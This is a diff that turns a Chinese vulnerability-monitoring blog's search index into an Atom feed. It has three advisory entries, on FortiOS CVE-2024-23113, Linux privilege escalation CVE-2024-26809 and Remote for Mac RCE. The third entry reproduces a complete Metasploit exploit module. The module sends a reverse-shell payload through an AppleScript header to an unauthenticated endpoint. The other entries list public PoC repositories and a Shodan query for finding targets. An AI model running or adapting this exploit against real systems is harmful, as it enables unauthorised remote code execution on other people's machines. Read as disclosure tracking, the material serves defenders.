@@ -1,92 +1,110 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>liancc&#39; infos blog</title>
   
   
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2025-06-02T02:30:21.977Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>lianccc</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
     <title>Fortinet FortiOS &amp; FortiProxy 格式字符串漏洞</title>
-    <link href="/2025/06/02/github_3198450016/"/>
-    <url>/2025/06/02/github_3198450016/</url>
+    <link href="http://example.com/2025/06/02/github_3198450016/"/>
+    <id>http://example.com/2025/06/02/github_3198450016/</id>
+    <published>2025-06-02T02:30:21.981Z</published>
+    <updated>2025-06-02T02:30:21.977Z</updated>
     
     <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Fortinet FortiOS &amp; FortiProxy 格式字符串漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-23113</li></ul><p><strong>漏洞类型：</strong> 格式字符串漏洞</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Fortinet FortiOS、FortiProxy、FortiPAM和FortiSwitchManager在处理特制数据包时存在格式字符串漏洞，攻击者可利用此漏洞执行任意代码或命令。</p><p><strong>产品厂商：</strong> Fortinet</p><p><strong>产品名称：</strong> FortiOS, FortiProxy, FortiPAM, FortiSwitchManager</p><p><strong>影响版本：</strong> FortiOS (7.4.0-7.4.2, 7.2.0-7.2.6, 7.0.0-7.0.13), FortiProxy (7.4.0-7.4.2, 7.2.0-7.2.8, 7.0.0-7.0.14), FortiPAM (1.2.0, 1.1.0-1.1.2, 1.0.0-1.0.3), FortiSwitchManager (7.2.0-7.2.3, 7.0.0-7.0.3)</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:fortinet:fortios”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12222">https://github.com/projectdiscovery/nuclei-templates/issues/12222</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### Description: <br>&gt; Fortinet FortiOS (versions <span class="hljs-number">7.4</span><span class="hljs-number">.0</span><span class="hljs-number">-7.4</span><span class="hljs-number">.2</span>, <span class="hljs-number">7.2</span><span class="hljs-number">.0</span><span class="hljs-number">-7.2</span><span class="hljs-number">.6</span>, <span class="hljs-number">7.0</span><span class="hljs-number">.0</span><span class="hljs-number">-7.0</span><span class="hljs-number">.13</span>), FortiProxy (versions <span class="hljs-number">7.4</span><span class="hljs-number">.0</span><span class="hljs-number">-7.4</span><span class="hljs-number">.2</span>, <span class="hljs-number">7.2</span><span class="hljs-number">.0</span><span class="hljs-number">-7.2</span><span class="hljs-number">.8</span>, <span class="hljs-number">7.0</span><span class="hljs-number">.0</span><span class="hljs-number">-7.0</span><span class="hljs-number">.14</span>), FortiPAM (versions <span class="hljs-number">1.2</span><span class="hljs-number">.0</span>, <span class="hljs-number">1.1</span><span class="hljs-number">.0</span><span class="hljs-number">-1.1</span><span class="hljs-number">.2</span>, <span class="hljs-number">1.0</span><span class="hljs-number">.0</span><span class="hljs-number">-1.0</span><span class="hljs-number">.3</span>), and FortiSwitchManager (versions <span class="hljs-number">7.2</span><span class="hljs-number">.0</span><span class="hljs-number">-7.2</span><span class="hljs-number">.3</span>, <span class="hljs-number">7.0</span><span class="hljs-number">.0</span><span class="hljs-number">-7.0</span><span class="hljs-number">.3</span>) contain a use <span class="hljs-keyword">of</span> externally-controlled format string caused by processing specially crafted packets, letting attackers execute arbitrary <span class="hljs-keyword">code</span> or commands.<br><br>#### Severity: \`Critical\`<br><br>#### POC: <br>- https:<span class="hljs-comment">//vulncheck.com/xdb/aad788d038d3</span><br>- https:<span class="hljs-comment">//github.com/valornode/CVE-2024-23113</span><br>- https<span class="hljs-comment">///github.com:valornode/CVE-2024-23113.git</span><br>- https:<span class="hljs-comment">//vulncheck.com/xdb/b3ae997acc06</span><br>- https:<span class="hljs-comment">//github.com/XiaomingX/cve-2024-23113-poc</span><br>- https<span class="hljs-comment">///github.com:XiaomingX/cve-2024-23113-poc.git</span><br>- https:<span class="hljs-comment">//github.com/XiaomingX/cve-2024-23113-exp</span><br>- https:<span class="hljs-comment">//github.com/expl0itsecurity/CVE-2024-23113</span><br>- https:<span class="hljs-comment">//vulncheck.com/xdb/0548206afc9c</span><br>- https:<span class="hljs-comment">//github.com/puckiestyle/CVE-2024-23113</span><br>- https<span class="hljs-comment">///github.com:puckiestyle/CVE-2024-23113.git</span><br>- https:<span class="hljs-comment">//vulncheck.com/xdb/3039091c436b</span><br>- https:<span class="hljs-comment">//github.com/p33d/CVE-2024-23113</span><br>- https<span class="hljs-comment">///github.com:p33d/CVE-2024-23113.git</span><br>- https:<span class="hljs-comment">//github.com/CheckCve2/CVE-2024-23113</span><br><br>### KEV: <span class="hljs-literal">True</span><br><br>### Shodan Query: \`cpe:<span class="hljs-string">&quot;cpe:2.3:o:fortinet:fortios&quot;</span>\`<br><br>&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(\`-debug\`) along <span class="hljs-keyword">with</span> the template to help the triage team <span class="hljs-keyword">with</span> validation or can also share a vulnerable environment like docker file. <br><br>&gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding <span class="hljs-keyword">code</span> templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates <span class="hljs-keyword">with</span> other protocols unless exceptions are made.<br><br>You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https:<span class="hljs-comment">//github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).</span><br></code></pre></td></tr></table></figure>]]></content>
     
     
-    <categories>
       
-      <category>Github Poc 监控</category>
       
-    </categories>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Fortinet FortiOS &amp;amp; FortiProxy 格式字符串漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-202</summary>
+      
     
     
-    <tags>
-      
-      <tag>CVE-2024-23113</tag>
-      
-      <tag>格式字符串漏洞</tag>
-      
-      <tag>projectdiscovery/nuclei-templates:github issues</tag>
-      
-    </tags>
+    
+    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CVE-2024-23113" scheme="http://example.com/tags/CVE-2024-23113/"/>
+    
+    <category term="格式字符串漏洞" scheme="http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
-  
-  
   <entry>
     <title>Linux 权限提升漏洞 (CVE-2024-26809)</title>
-    <link href="/2025/06/01/github_3933360352/"/>
-    <url>/2025/06/01/github_3933360352/</url>
+    <link href="http://example.com/2025/06/01/github_3933360352/"/>
+    <id>http://example.com/2025/06/01/github_3933360352/</id>
+    <published>2025-06-01T22:15:14.899Z</published>
+    <updated>2025-06-01T22:15:14.896Z</updated>
     
     <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Linux 权限提升漏洞 (CVE-2024-26809)</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-26809</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2024-26809是一个Linux权限提升漏洞，允许攻击者在受影响的系统上提升权限。此漏洞的利用代码已公开，且被描述为一个自包含、超便携的Linux exploit。</p><p><strong>产品名称：</strong> Linux</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/19863">https://github.com/rapid7/metasploit-framework/issues/19863</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;!<span class="hljs-comment">--</span><br>  To make <span class="hljs-keyword">it</span> easier <span class="hljs-keyword">for</span> us <span class="hljs-built_in">to</span> help you, please <span class="hljs-built_in">include</span> <span class="hljs-keyword">as</span> much useful information <span class="hljs-keyword">as</span> possible.<br><br>  Useful Links:<br>  - Wiki: <span class="hljs-keyword">https</span>://docs.metasploit.com/<br><br>  Before opening <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> issue, please search existing issues <span class="hljs-keyword">https</span>://github.com/rapid7/metasploit-framework/issues<br><span class="hljs-comment">--&gt;</span><br><br><span class="hljs-comment">## Summary</span><br><br>Offset-less Linux LPE (CVE<span class="hljs-number">-2024</span><span class="hljs-number">-26809</span>)<br><br><span class="hljs-comment">### Basic example</span><br><br>![Image](<span class="hljs-keyword">https</span>://github.com/user-attachments/assets/f77f9608-d343<span class="hljs-number">-4039</span><span class="hljs-number">-80</span>a8<span class="hljs-number">-51</span>fb1bd64716)<br><br>- <span class="hljs-keyword">https</span>://osec.io/blog/<span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-25</span>-netfilter-universal-root<span class="hljs-number">-1</span>-day/<br>- <span class="hljs-keyword">https</span>://github.com/otter-<span class="hljs-built_in">sec</span>/OtterRoot/tree/master<br><br><span class="hljs-comment">### Motivation</span><br><br>Self-contained (<span class="hljs-keyword">a</span> single exploit.c <span class="hljs-built_in">file</span>) ultra-portable Linux exploit.<br></code></pre></td></tr></table></figure>]]></content>
     
     
-    <categories>
       
-      <category>Github Poc 监控</category>
       
-    </categories>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Linux 权限提升漏洞 (CVE-2024-26809)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2024-26809&lt;/li&gt;</summary>
+      
     
     
-    <tags>
-      
-      <tag>rapid7/metasploit-framework:github issues</tag>
-      
-      <tag>权限提升</tag>
-      
-      <tag>CVE-2024-26809</tag>
-      
-    </tags>
+    
+    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    
+    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    
+    <category term="CVE-2024-26809" scheme="http://example.com/tags/CVE-2024-26809/"/>
     
   </entry>
   
-  
-  
   <entry>
     <title>Remote for Mac 未授权远程代码执行漏洞</title>
-    <link href="/2025/06/01/github_3791900306/"/>
-    <url>/2025/06/01/github_3791900306/</url>
+    <link href="http://example.com/2025/06/01/github_3791900306/"/>
+    <id>http://example.com/2025/06/01/github_3791900306/</id>
+    <published>2025-06-01T20:45:16.061Z</published>
+    <updated>2025-06-01T20:45:16.058Z</updated>
     
     <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Remote for Mac 未授权远程代码执行漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块利用了Remote for Mac版本至2025.7（包括补丁版本）中的未授权远程代码执行漏洞，通过&#x2F;api&#x2F;executeScript端点。当目标系统上禁用认证时，攻击者可以执行任意AppleScript命令，包括通过<code>do shell script</code>执行的shell命令。</p><p><strong>产品名称：</strong> Remote for Mac</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2025.7</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb">https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><pre><code class="hljs">require &#39;json&#39;class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::Remote::HttpClient  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = &#123;&#125;)    super(      update_info(        info,        &#39;Name&#39; =&gt; &#39;Remote for Mac &lt;= 2025.7 - Unauthenticated RCE&#39;,        &#39;Description&#39; =&gt; %q&#123;          This module exploits an unauthenticated remote code execution vulnerability in          Remote for Mac versions up to and including 2025.7 via the /api/executeScript endpoint.          When authentication is disabled on the target system, it allows attackers to execute          arbitrary AppleScript commands, which can include shell commands via \`do shell script\`.          All versions up to 2025.7 (including patch versions) are vulnerable.        &#125;,        &#39;License&#39; =&gt; MSF_LICENSE,        &#39;Author&#39; =&gt; [&#39;Chokri Hammedi (@blue0x1)&#39;],        &#39;References&#39; =&gt; [          [&#39;PACKETSTORM&#39;, &#39;195347&#39;]        ],        &#39;DisclosureDate&#39; =&gt; &#39;2025-05-27&#39;,        &#39;Platform&#39; =&gt; [&#39;unix&#39;,&#39;osx&#39;],        &#39;Arch&#39; =&gt; ARCH_CMD,        &#39;Targets&#39; =&gt; [[&#39;Auto&#39;, &#123;&#125;]],        &#39;DefaultTarget&#39; =&gt; 0,        &#39;DefaultOptions&#39; =&gt; &#123;          &#39;RPORT&#39; =&gt; 49229,          &#39;SSL&#39; =&gt; true        &#125;,        &#39;Notes&#39; =&gt; &#123;          &#39;Stability&#39; =&gt; [&#39;CRASH_SAFE&#39;],          &#39;Reliability&#39; =&gt; [&#39;REPEATABLE_SESSION&#39;],          &#39;SideEffects&#39; =&gt; [&#39;ARTIFACTS_ON_DISK&#39;]        &#125;      )    )  end  def check    res = send_request_cgi(      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;getVersion&#39;),      &#39;method&#39; =&gt; &#39;GET&#39;    )    return CheckCode::Unknown(&#39;No response from target&#39;) unless res&amp;.code == 200    info = res.get_json_document    if info.empty?      return CheckCode::Unknown(&#39;Unable to parse JSON from /api/getVersion&#39;)    end    if info.dig(&#39;requires.auth&#39;) == true      return CheckCode::Safe(&#39;Target requires authentication on /api/executeScript&#39;)    end    version = info.dig(&#39;version&#39;).to_s    if version.empty?      return CheckCode::Unknown(&#39;Could not determine target version&#39;)    end    begin      target_version = Rex::Version.new(version)      vulnerable_version = Rex::Version.new(&#39;2025.7&#39;)            if target_version &lt;= vulnerable_version        return CheckCode::Appears      else        return CheckCode::Safe(&quot;Target version #&#123;version&#125; is not vulnerable&quot;)      end    rescue ArgumentError      return CheckCode::Unknown(&quot;Invalid version format: #&#123;version&#125;&quot;)    end  end  def exploit    print_status(&quot;Generating reverse shell payload for #&#123;datastore[&#39;LHOST&#39;]&#125;:#&#123;datastore[&#39;LPORT&#39;]&#125;&quot;)    cmd = payload.encoded    applescript = %(do shell script &quot;#&#123;cmd&#125;&quot;)    host_name = Rex::Text.rand_text_alpha(8)    host_model = &quot;#&#123;Rex::Text.rand_text_alpha(4)&#125;#&#123;rand(99)&#125;&quot;    script_name = Rex::Text.rand_text_alpha(8)    print_status(&quot;Sending exploit to #&#123;rhost&#125;:#&#123;rport&#125; via AppleScript&quot;)    res = send_request_cgi(      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;executeScript&#39;),      &#39;method&#39; =&gt; &#39;GET&#39;,      &#39;headers&#39; =&gt; &#123;        &#39;X-ClientToken&#39; =&gt; Rex::Text.rand_text_numeric(4),        &#39;X-HostName&#39; =&gt; host_name,        &#39;X-HostFullModel&#39; =&gt; host_model,        &#39;X-Script&#39; =&gt; applescript,        &#39;X-ScriptName&#39; =&gt; script_name,        &#39;X-ScriptDelay&#39; =&gt; &#39;0&#39;      &#125;    )    if res&amp;.code == 200      print_good(&#39;Payload delivered successfully. Awaiting session...&#39;)    else      fail_with(Failure::UnexpectedReply, &quot;Unexpected HTTP response: #&#123;res&amp;.code || &#39;no response&#39;&#125;&quot;)    end  endend```</code></pre>]]></content>
     
     
-    <categories>
       
-      <category>Github Poc 监控</category>
       
-    </categories>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Remote for Mac 未授权远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 未授权访问&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞等级：&lt;/strong&gt; 高危&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞描</summary>
+      
     
     
-    <tags>
-      
-      <tag>rapid7/metasploit-framework:github issues</tag>
-      
-      <tag>未授权访问</tag>
-      
-    </tags>
+    
+    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     
   </entry>
   
-  
-  
-  
-</search>
+</feed>
